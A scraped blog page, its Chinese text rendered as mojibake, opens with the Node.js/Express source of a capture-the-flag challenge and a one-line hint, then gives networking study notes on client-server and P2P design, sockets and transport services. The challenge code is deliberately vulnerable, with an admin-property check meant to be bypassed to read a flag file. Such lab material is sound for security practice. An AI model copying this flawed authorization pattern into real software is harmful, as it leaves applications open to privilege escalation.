class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">var</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&quot;express-session&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>);</span><br><span class="line"></span><br><span class="line">session_secret = <span class="title class_">Math</span>.<span class="title function_">random</span>().<span class="title function_">toString</span>(<span class="number">36</span>).<span class="title function_">substr</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>(session_secret));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">    <span class="attr">secret</span>: session_secret,</span><br><span class="line">    <span class="attr">resave</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">saveUninitialized</span>: <span class="literal">true</span></span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">copyArray</span>(<span class="params">arr1</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> arr2 = <span class="keyword">new</span> <span class="title class_">Array</span>(arr1.<span class="property">length</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr1.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (arr1[i] <span class="keyword">instanceof</span> <span class="title class_">Object</span>) &#123;</span><br><span class="line">            arr2[i] = <span class="title function_">copyArray</span>(arr1[i]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            arr2[i] = arr1[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;see `/src`&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/get_admin&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">body</span>.<span class="property">name</span>) &#123;</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">user</span> = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: req.<span class="property">body</span>.<span class="property">name</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">const</span> properties = req.<span class="property">body</span>.<span class="property">properties</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; properties.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (properties[i] == <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">                res.<span class="title function_">send</span>(<span class="string">&#x27;cant set admin by self&#x27;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">properties</span> = <span class="title function_">copyArray</span>(properties);</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;Success&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;input username&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">session</span>.<span class="property">user</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">__proto__</span>)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">user</span> &amp;&amp; req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">properties</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">properties</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">properties</span>[i] == <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">const</span> data = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">                    res.<span class="title function_">send</span>(data)</span><br><span class="line">                &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">                    res.<span class="title function_">send</span>(<span class="string">&quot;fail to open flag&quot;</span>)</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;not vm2 tester rights&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/src&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> data = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;app.js&#x27;</span>);</span><br><span class="line">    res.<span class="title function_">send</span>(data.<span class="title function_">toString</span>());</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;start listening on port 3000&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æç¤ºè¯´ä¸æ˜¯åŸå‹é“¾æ±¡æŸ“ï¼Œåˆ†æä»£ç ä¹Ÿå¾—çŸ¥å¹¶ä¸æ˜¯æ²™ç®±é€ƒé€¸</p>
</div><div class="index-category-tag"><div class="level-item"><i class="fas fa-folder-open has-text-grey">Â </i><a class="article-more button is-small link-muted index-categories" href="/categories/Scr1w%E5%B9%B3%E5%8F%B0/">Scr1wå¹³å°</a></div>Â Â <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus">Â </i>2024-03-26Â Â <a class="commentCountImg" href="/2024/03/26/ComputerInternet/Computer-Internet2/#comment-container"><span class="display-none-class">a5c06845f4d2420c4b139b5eec2734f4</span><i class="far fa-comment-dots"></i>Â <span class="commentCount" id="a5c06845f4d2420c4b139b5eec2734f4">99+</span>Â Â </a><span class="level-item"><i class="far fa-clock">Â </i>1 å°æ—¶ Â <i class="fas fa-pencil-alt">Â </i>9.3Â k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2024/03/26/ComputerInternet/Computer-Internet2/">è®¡ç½‘å­¦ä¹ ç¬”è®°ï¼ˆ2ï¼‰</a></h1><div class="content"><h1 id="åº”ç”¨å±‚"><a href="#åº”ç”¨å±‚" class="headerlink" title="åº”ç”¨å±‚"></a>åº”ç”¨å±‚</h1><h2 id="åº”ç”¨å±‚åè®®åŸç†"><a href="#åº”ç”¨å±‚åè®®åŸç†" class="headerlink" title="åº”ç”¨å±‚åè®®åŸç†"></a>åº”ç”¨å±‚åè®®åŸç†</h2><h3 id="ç½‘ç»œåº”ç”¨ç¨‹åºä½“ç³»æ¶æ„"><a href="#ç½‘ç»œåº”ç”¨ç¨‹åºä½“ç³»æ¶æ„" class="headerlink" title="ç½‘ç»œåº”ç”¨ç¨‹åºä½“ç³»æ¶æ„"></a>ç½‘ç»œåº”ç”¨ç¨‹åºä½“ç³»æ¶æ„</h3><p>åº”ç”¨ç¨‹åºä½“ç³»ç»“æ„ï¼ˆapplication architectureï¼‰ç”±åº”ç”¨ç¨‹åºç ”å‘è€…è®¾è®¡ï¼Œè§„å®šäº†å¦‚ä½•åœ¨å„ç§ç«¯ç³»ç»Ÿä¸Šç»„ç»‡è¿™ä¸ªåº”ç”¨ç¨‹åºã€‚</p>
<p>ç›®å‰çš„ç°ä»£ç½‘ç»œåº”ç”¨ç¨‹åºä¸­ä¸€èˆ¬ä¼šé€‰æ‹©ä¸¤ç§ä¸»æµæ¶æ„ï¼š==å®¢æˆ·-æœåŠ¡å™¨ä½“ç³»ç»“æ„å’Œå¯¹ç­‰ï¼ˆP2Pï¼‰ä½“ç³»ç»“æ„==</p>
<h4 id="å®¢æˆ·-æœåŠ¡å™¨ä½“ç³»ç»“æ„"><a href="#å®¢æˆ·-æœåŠ¡å™¨ä½“ç³»ç»“æ„" class="headerlink" title="å®¢æˆ·-æœåŠ¡å™¨ä½“ç³»ç»“æ„"></a>å®¢æˆ·-æœåŠ¡å™¨ä½“ç³»ç»“æ„</h4><p>æœåŠ¡å™¨æ˜¯ä¸€ä¸ª==æ€»æ˜¯å¤„äºå¼€æœºçŠ¶æ€==çš„ä¸»æœºï¼Œå®ƒæœåŠ¡äºæ¥è‡ªè®¸å¤šå…¶ä»–ç§°ä¸º<strong>å®¢æˆ·</strong>çš„ä¸»æœºçš„è¯·æ±‚ã€‚</p>
<h5 id="ç‰¹å¾"><a href="#ç‰¹å¾" class="headerlink" title="ç‰¹å¾"></a>ç‰¹å¾</h5><ol>
<li>ä¸¤ä¸ªæˆ–å¤šä¸ªå®¢æˆ·ä¹‹é—´æ˜¯ä¸ä¼šç›´æ¥å»ºç«‹é€šä¿¡çš„ï¼›</li>
<li>æœåŠ¡å™¨å…·æœ‰å›ºå®šçš„ã€å‘¨çŸ¥çš„åœ°å€ï¼Œå³IPåœ°å€</li>
</ol>
<h5 id="åº”ç”¨"><a href="#åº”ç”¨" class="headerlink" title="åº”ç”¨"></a>åº”ç”¨</h5><p>Webã€FTPï¼ˆæ–‡ä»¶ä¼ è¾“åè®®ï¼‰ã€Telnetï¼ˆä¸€ç§è¿œç¨‹ç™»å½•çš„åè®®ï¼‰ã€ç”µå­é‚®ä»¶â€¦â€¦</p>
<h5 id="å…¶ä»–ä½ éœ€è¦çŸ¥é“çš„"><a href="#å…¶ä»–ä½ éœ€è¦çŸ¥é“çš„" class="headerlink" title="å…¶ä»–ä½ éœ€è¦çŸ¥é“çš„"></a>å…¶ä»–ä½ éœ€è¦çŸ¥é“çš„</h5><p>ç”±äºä½¿ç”¨äº’è”ç½‘çš„äººå¾ˆå¤šï¼Œå‘æœåŠ¡å™¨å‘é€çš„è¯·æ±‚ä¹Ÿå¾ˆå¤šï¼Œæƒ³è¦ä¸€ä¸ªæœåŠ¡å™¨æ¥æœåŠ¡æ‰€æœ‰è¯·æ±‚æ˜¯ä¸ç°å®çš„ã€‚</p>
<p>å› æ­¤ï¼Œ<strong>æ•°æ®ä¸­å¿ƒ</strong>çš„ä½œç”¨å°±ä½“ç°å‡ºæ¥äº†ï¼Œå®ƒé…å¤‡äº†å¤§é‡çš„ä¸»æœºï¼Œç”¨äºåˆ›å»ºä¸€ä¸ªå¼ºå¤§çš„è™šæ‹ŸæœåŠ¡å™¨ã€‚</p>
<p>å®ƒçš„åº”ç”¨æƒ³å¿…éƒ½è§è¿‡ï¼Œä¾‹å¦‚æœç´¢å¼•æ“baiduï¼Œè°·æ­Œï¼›Internetå•†åŠ¡äºšé©¬é€Šï¼Œé˜¿é‡Œå·´å·´ï¼›ç¤¾äº¤ç½‘ç»œFacebookã€æ¨ç‰¹</p>
<h4 id="P2Pä½“ç³»ç»“æ„"><a href="#P2Pä½“ç³»ç»“æ„" class="headerlink" title="P2Pä½“ç³»ç»“æ„"></a>P2Pä½“ç³»ç»“æ„</h4><p>è¿™ä¸ªç»“æ„å¯¹ä½äºæ•°æ®ä¸­å¿ƒçš„ä¸“ç”¨æœåŠ¡å™¨å…·æœ‰å¾ˆå°‘çš„ä¾èµ–ï¼ˆæœ‰æ—¶å€™å¯ä»¥æ²¡æœ‰ï¼‰ï¼Œé€‰ç”¨è¿™ç§ç»“æ„çš„åº”ç”¨ç¨‹åºåœ¨==é—´æ–­è¿æ¥çš„ä¸»æœºå¯¹ä¹‹é—´ä½¿ç”¨ç›´æ¥é€šä¿¡==ï¼Œè¿™äº›ä¸»æœºå¯¹è¢«ç§°ä¸º<strong>å¯¹ç­‰æ–¹</strong>ã€‚</p>
<p>:::info</p>
<p>å¯¹ç­‰æ–¹çš„ä¸€äº›è§£é‡Šå¯ä»¥å‚è€ƒå‚è€ƒä¸Šä¸€ç« <strong>ç½‘ç»œçš„ç½‘ç»œ</strong>éƒ¨åˆ†</p>
<p>:::</p>
<h5 id="ç‰¹æ€§"><a href="#ç‰¹æ€§" class="headerlink" title="ç‰¹æ€§"></a>ç‰¹æ€§</h5><ol>
<li>==è‡ªæ‰©å±•æ€§==ã€‚P2Pç½‘ç»œæ˜¯ç”±è®¸å¤šç”¨æˆ·èŠ‚ç‚¹ç»„æˆçš„ï¼Œå½“æœ‰æ–°çš„ç”¨æˆ·åŠ å…¥æ—¶ï¼ŒæœåŠ¡çš„éœ€æ±‚è™½ç„¶åœ¨å¢åŠ ï¼Œä½†æ˜¯ç³»ç»Ÿæ•´ä½“çš„èµ„æºå’ŒæœåŠ¡èƒ½åŠ›ä¹Ÿéšä¹‹æ‰©å……ï¼Œèƒ½è¾ƒå¤§ç¨‹åº¦ä¸Šæ»¡è¶³ç”¨æˆ·çš„éœ€æ±‚ã€‚åœ¨æœåŠ¡å™¨ç»„æˆçš„P2Pç½‘ç»œä¸­ï¼Œåªéœ€å¢åŠ æœåŠ¡å™¨å°±èƒ½å®Œæˆå¹³æ»‘çš„æ‰©å®¹ã€‚</li>
<li>æˆæœ¬ä½ã€‚P2Pç½‘ç»œæˆ–è€…åº”ç”¨ç¨‹åºä¸€èˆ¬æ˜¯ä¸éœ€è¦åºå¤§çš„æœåŠ¡å™¨åŸºç¡€è®¾æ–½å’ŒæœåŠ¡å™¨å¸¦å®½ï¼ˆä¸å®¢æˆ·-æœåŠ¡å™¨ç›¸å¯¹ï¼‰</li>
</ol>
<h3 id="è¿›ç¨‹é€šä¿¡"><a href="#è¿›ç¨‹é€šä¿¡" class="headerlink" title="è¿›ç¨‹é€šä¿¡"></a>è¿›ç¨‹é€šä¿¡</h3><p>ç«™åœ¨æ“ä½œç³»ç»Ÿçš„è§’åº¦ï¼Œè¿›è¡Œé€šä¿¡çš„å®é™…ä¸Šæ˜¯<strong>è¿›ç¨‹</strong>è€Œå¹¶éç¨‹åºã€‚</p>
<p>åœ¨ä¸¤ä¸ªä¸åŒç«¯ç³»ç»Ÿä¸Šçš„è¿›ç¨‹ï¼Œé€šè¿‡è·¨è¶Šè®¡ç®—æœºç½‘ç»œäº¤æ¢<strong>æŠ¥æ–‡</strong>æ¥è¿›è¡Œé€šä¿¡ã€‚</p>
<h4 id="å®¢æˆ·å’ŒæœåŠ¡å™¨è¿›ç¨‹"><a href="#å®¢æˆ·å’ŒæœåŠ¡å™¨è¿›ç¨‹" class="headerlink" title="å®¢æˆ·å’ŒæœåŠ¡å™¨è¿›ç¨‹"></a>å®¢æˆ·å’ŒæœåŠ¡å™¨è¿›ç¨‹</h4><p>ç½‘ç»œåº”ç”¨ç¨‹åº==ç”±æˆå¯¹çš„è¿›ç¨‹ç»„æˆï¼Œè¿™äº›è¿›ç¨‹é€šè¿‡ç½‘ç»œç›¸äº’å‘é€æŠ¥æ–‡==ã€‚</p>
<p>åœ¨è¿™ä¸€å¯¹è¿›ç¨‹ä¸­ï¼Œæˆ‘ä»¬å°†å…¶ä¸­ä¹‹ä¸€æ ‡è®°ä¸º<strong>å®¢æˆ·</strong>ï¼Œå¦ä¸€ä¸ªåˆ™æ˜¯<strong>æœåŠ¡å™¨</strong>äº†ã€‚</p>
<h5 id="ä¸¾ä¸ªæ —å­"><a href="#ä¸¾ä¸ªæ —å­" class="headerlink" title="ä¸¾ä¸ªæ —å­"></a>ä¸¾ä¸ªæ —å­</h5><p>åœ¨Webçš„åº”ç”¨ç¨‹åºä¸­ï¼Œä¸€ä¸ªå®¢æˆ·æµè§ˆå™¨è¿›ç¨‹ä¸ä¸€å°æœåŠ¡å™¨è¿›ç¨‹ç›¸äº’äº¤æ¢æŠ¥æ–‡ã€‚æ­¤æ—¶æµè§ˆå™¨å°±æ˜¯å®¢æˆ·è¿›ç¨‹ï¼ŒWebæœåŠ¡å™¨å°±æ˜¯æœåŠ¡å™¨è¿›ç¨‹ã€‚</p>
<p>åœ¨P2Pæ–‡ä»¶å…±äº«ç³»ç»Ÿä¸­ï¼Œæ–‡ä»¶ä»ä¸€ä¸ªå¯¹ç­‰æ–¹è¿›ç¨‹ä¼ è¾“åˆ°å¦ä¸€ä¸ªå¯¹ç­‰æ–¹è¿›ç¨‹ã€‚æ­¤æ—¶ä¸‹è½½æ–¹è¢«æ ‡è¯†ä¸ºå®¢æˆ·ï¼Œä¸Šä¼ æ–¹åˆ™è¢«æ ‡è¯†ä¸ºæœåŠ¡å™¨ã€‚</p>
<h5 id="å¦‚ä½•å®šä¹‰å®¢æˆ·è¿›ç¨‹ä¸æœåŠ¡å™¨è¿›ç¨‹"><a href="#å¦‚ä½•å®šä¹‰å®¢æˆ·è¿›ç¨‹ä¸æœåŠ¡å™¨è¿›ç¨‹" class="headerlink" title="å¦‚ä½•å®šä¹‰å®¢æˆ·è¿›ç¨‹ä¸æœåŠ¡å™¨è¿›ç¨‹"></a>å¦‚ä½•å®šä¹‰å®¢æˆ·è¿›ç¨‹ä¸æœåŠ¡å™¨è¿›ç¨‹</h5><p>ä»¥ä¸‹å®šä¹‰==åŸºäºä¸€å¯¹è¿›ç¨‹ä¹‹é—´çš„é€šä¿¡ä¼šè¯åœºæ™¯==ä¸­</p>
<p>å®¢æˆ·ï¼šå‘èµ·é€šè¯çš„è¿›ç¨‹ã€‚</p>
<p>æœåŠ¡å™¨ï¼šåœ¨ä¼šè¯å¼€å§‹æ—¶ç­‰å¾…è”ç³»çš„è¿›ç¨‹ã€‚</p>
<h4 id="è¿›ç¨‹ä¸è®¡ç®—æœºç½‘ç»œä¹‹é—´çš„æ¥å£"><a href="#è¿›ç¨‹ä¸è®¡ç®—æœºç½‘ç»œä¹‹é—´çš„æ¥å£" class="headerlink" title="è¿›ç¨‹ä¸è®¡ç®—æœºç½‘ç»œä¹‹é—´çš„æ¥å£"></a>è¿›ç¨‹ä¸è®¡ç®—æœºç½‘ç»œä¹‹é—´çš„æ¥å£</h4><p>è¿›ç¨‹é€šè¿‡ä¸€ä¸ª<strong>å¥—æ¥å­—</strong>çš„è½¯ä»¶æ¥å£å‘ç½‘ç»œå‘é€æŠ¥æ–‡å’Œä»ç½‘ç»œæ¥æ”¶æŠ¥æ–‡</p>
<p>ä¸‹å›¾æ˜¯ä¸¤ä¸ªé€šè¿‡å› ç‰¹ç½‘é€šä¿¡çš„è¿›ç¨‹ä¹‹é—´çš„å¥—æ¥å­—é€šä¿¡</p>
<img src="/2024/03/26/ComputerInternet/Computer-Internet2/image-20240326223829224.png" class="" title="image-20240326223829224">

<p>åœ¨è¿™ä¸ªå›¾ä¸­ï¼Œå¥—æ¥å­—æ˜¯åŒä¸€å°ä¸»æœºå†…åº”ç”¨å±‚ä¸è¿è¾“å±‚çš„æ¥å£ï¼Œä¹Ÿæ˜¯å»ºç«‹ç½‘ç»œåº”ç”¨ç¨‹åºçš„å¯ç¼–ç¨‹æ¥å£ï¼Œå› æ­¤ä¹Ÿè¢«ç§°ä¸º<strong>ç½‘ç»œåº”ç”¨ç¨‹åºæ¥å£</strong>ï¼ˆApplication Programming Interfaceï¼ŒAPIï¼‰</p>
<h5 id="åº”ç”¨ç¨‹åºå¼€å‘è€…å¯¹å¥—æ¥å­—çš„ç®¡ç†"><a href="#åº”ç”¨ç¨‹åºå¼€å‘è€…å¯¹å¥—æ¥å­—çš„ç®¡ç†" class="headerlink" title="åº”ç”¨ç¨‹åºå¼€å‘è€…å¯¹å¥—æ¥å­—çš„ç®¡ç†"></a>åº”ç”¨ç¨‹åºå¼€å‘è€…å¯¹å¥—æ¥å­—çš„ç®¡ç†</h5><p>ä»å¼€å‘è€…çš„è§’åº¦çœ‹ï¼Œä»–ä»¬èƒ½å¤Ÿ==æ§åˆ¶å¥—æ¥å­—åœ¨åº”ç”¨å±‚ä¸Šçš„ä¸€åˆ‡==ã€‚</p>
<p>å¯¹è¿è¾“å±‚çš„å¥—æ¥å­—çš„æ§åˆ¶å‡ ä¹æ˜¯æ‰‹è¶³æ— æªçš„ï¼Œä»…é™äº</p>
<ol>
<li>é€‰æ‹©è¿è¾“å±‚åè®®</li>
<li>è®¾å®šå‡ ä¸ªè¿è¾“å±‚å‚æ•°ï¼Œå¦‚æœ€å¤§æŠ¥æ–‡é•¿åº¦</li>
</ol>
<h4 id="è¿›ç¨‹å¯»å€"><a href="#è¿›ç¨‹å¯»å€" class="headerlink" title="è¿›ç¨‹å¯»å€"></a>è¿›ç¨‹å¯»å€</h4><p>ä¸€å°ä¸»æœºä¸Šè¿è¡Œçš„è¿›ç¨‹å¦‚æœæƒ³è¦å‘å¦ä¸€å°ä¸»æœºä¸Šè¿è¡Œçš„è¿›ç¨‹å‘é€åˆ†ç»„ï¼Œåˆ™éœ€è¦è®©æ¥æ”¶è¿›ç¨‹æœ‰ä¸€ä¸ªåœ°å€ã€‚</p>
<p>ä¸ºäº†è®©æ¥æ”¶è¿›ç¨‹è¢«æ ‡è¯†åˆ°ï¼Œæˆ‘ä»¬éœ€è¦ä¸¤ç§ä¿¡æ¯ï¼š</p>
<ol>
<li>ä¸»æœºçš„åœ°å€</li>
<li>åœ¨ç›®çš„ä¸»æœºä¸­æŒ‡å®šæ¥æ”¶è¿›ç¨‹çš„æ ‡è¯†ç¬¦</li>
</ol>
<p>åœ¨å› ç‰¹ç½‘ä¸­ï¼Œ==ä¸»æœºæ˜¯ç”±IPåœ°å€æ ‡è¯†çš„==ã€‚</p>
<p>é™¤äº†IPåœ°å€æ ‡è¯†å¤–ï¼Œè¿˜éœ€è¦==å‘é€è¿›ç¨‹æŒ‡å®šè¿è¡Œåœ¨æ¥æ”¶ä¸»æœºçš„æ¥æ”¶è¿›ç¨‹==ã€‚<strong>ç«¯å£å·</strong>çš„ä½œç”¨å°±åœ¨äºæ­¤ã€‚</p>
<h3 id="å¯ä¾›åº”ç”¨ç¨‹åºä½¿ç”¨çš„è¿è¾“æœåŠ¡"><a href="#å¯ä¾›åº”ç”¨ç¨‹åºä½¿ç”¨çš„è¿è¾“æœåŠ¡" class="headerlink" title="å¯ä¾›åº”ç”¨ç¨‹åºä½¿ç”¨çš„è¿è¾“æœåŠ¡"></a>å¯ä¾›åº”ç”¨ç¨‹åºä½¿ç”¨çš„è¿è¾“æœåŠ¡</h3><p>åœ¨å¤šç§å¤šæ ·çš„è¿è¾“æœåŠ¡ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å››ä¸ªæ–¹é¢å¯¹åº”ç”¨ç¨‹åºæœåŠ¡è¿›è¡Œåˆ†ç±»ï¼š==å¯é æ•°æ®ä¼ è¾“ï¼Œååé‡ï¼Œå®šæ—¶ï¼Œå®‰å…¨æ€§==</p>
<h4 id="å¯é æ•°æ®ä¼ è¾“"><a href="#å¯é æ•°æ®ä¼ è¾“" class="headerlink" title="å¯é æ•°æ®ä¼ è¾“"></a>å¯é æ•°æ®ä¼ è¾“</h4><h5 id="å¦‚ä½•åˆ¤æ–­"><a href="#å¦‚ä½•åˆ¤æ–­" class="headerlink" title="å¦‚ä½•åˆ¤æ–­"></a>å¦‚ä½•åˆ¤æ–­</h5><p>æŸä¸ªæœåŠ¡èƒ½å¤Ÿåšä¸€äº›å·¥ä½œæ¥ç¡®ä¿æŸåº”ç”¨ç¨‹åºçš„ä¸€ç«¯å‘é€çš„æ•°æ®æ­£ç¡®ï¼Œä¸”èƒ½å®Œå…¨åœ°äº¤ä»˜ç»™è¯¥åº”ç”¨ç¨‹åºçš„å¦ä¸€ç«¯ã€‚</p>
<h5 id="å…¶ä»–ä½ å¯èƒ½è¦çŸ¥é“çš„"><a href="#å…¶ä»–ä½ å¯èƒ½è¦çŸ¥é“çš„" class="headerlink" title="å…¶ä»–ä½ å¯èƒ½è¦çŸ¥é“çš„"></a>å…¶ä»–ä½ å¯èƒ½è¦çŸ¥é“çš„</h5><ol>
<li>è¿è¾“å±‚åè®®èƒ½å¤Ÿæ½œåœ¨åœ°å‘åº”ç”¨ç¨‹åºæä¾›ä¸€ç§é‡è¦æœåŠ¡ï¼Œè¿™ç§æœåŠ¡æ˜¯è¿›ç¨‹åˆ°è¿›ç¨‹çš„å¯é æ•°æ®ä¼ è¾“ã€‚å‘é€è¿›ç¨‹åªè¦å°†å…¶æ•°æ®ä¼ é€’è¿›å¥—æ¥å­—ï¼Œå°±å¯ä»¥å®Œå…¨ç›¸ä¿¡è¯¥æ•°æ®èƒ½å¤Ÿæ— å·®é”™åœ°åˆ°è¾¾æ¥æ”¶è¿›ç¨‹ã€‚</li>
<li>å¦‚æœè¿è¾“å±‚ä¸æä¾›è¿™ç§æœåŠ¡ï¼Œé‚£å¤§æ¦‚ç‡ä¼šè¢«ä¾èµ–è¿™ç§æœåŠ¡çš„åº”ç”¨æ‰€æ’æ–¥ï¼Œä½†å¯èƒ½ä¼šè¢«å®¹å¿ä¸¢å¤±çš„åº”ç”¨æ¥å—ï¼Œå¦‚ä¸€äº›å¤šåª’ä½“åº”ç”¨ï¼Œå®ƒçš„éƒ¨åˆ†æ•°æ®ä¸¢å¤±ä¸€èˆ¬åªä¼šå¯¼è‡´å¡é¡¿æˆ–è€…éŸ³é¢‘è¢«å¹²æ‰°ç­‰é—®é¢˜ï¼Œä½†é—®é¢˜ä¸å¤§</li>
</ol>
<h5 id="åº”ç”¨-1"><a href="#åº”ç”¨-1" class="headerlink" title="åº”ç”¨"></a>åº”ç”¨</h5><p>ç”µå­é‚®ä»¶ï¼Œæ–‡ä»¶ä¼ è¾“ï¼Œé‡‘èåº”ç”¨ç­‰ç­‰</p>
<h4 id="ååé‡"><a href="#ååé‡" class="headerlink" title="ååé‡"></a>ååé‡</h4><p>å•ä½ï¼š æ¯”ç‰¹/ç§’ =&gt; bit/s</p>
<p><strong>å¸¦å®½æ•æ„Ÿçš„åº”ç”¨ï¼ˆbandwidth-sensitive applicationï¼‰</strong>ï¼šå¯¹ååé‡æœ‰è¦æ±‚çš„åº”ç”¨ç¨‹åºã€‚</p>
<p><strong>å¼¹æ€§åº”ç”¨ï¼ˆelastic applicationï¼‰</strong>ï¼šè¯´ç™½äº†ï¼Œèƒ½å¤Ÿæ ¹æ®å¸¦å®½çŠ¶æ€åŠ¨æ€è°ƒæ•´ååé‡ã€‚</p>
<h3 id="å› ç‰¹ç½‘æä¾›çš„è¿è¾“æœåŠ¡"><a href="#å› ç‰¹ç½‘æä¾›çš„è¿è¾“æœåŠ¡" class="headerlink" title="å› ç‰¹ç½‘æä¾›çš„è¿è¾“æœåŠ¡"></a>å› ç‰¹ç½‘æä¾›çš„è¿è¾“æœåŠ¡</h3><p>å› ç‰¹ç½‘ä¸ºåº”ç”¨ç¨‹åºæä¾›äº†ä¸¤ä¸ªè¿è¾“å±‚åè®®ï¼Œåˆ†åˆ«ä¸º==UDPå’ŒTCP==ã€‚</p>
<p>é™„ï¼šåº”ç”¨ç¨‹åºçš„æœåŠ¡è¦æ±‚</p>
<img src="/2024/03/26/ComputerInternet/Computer-Internet2/image-20240403182749113.png" class="" title="image-20240403182749113">

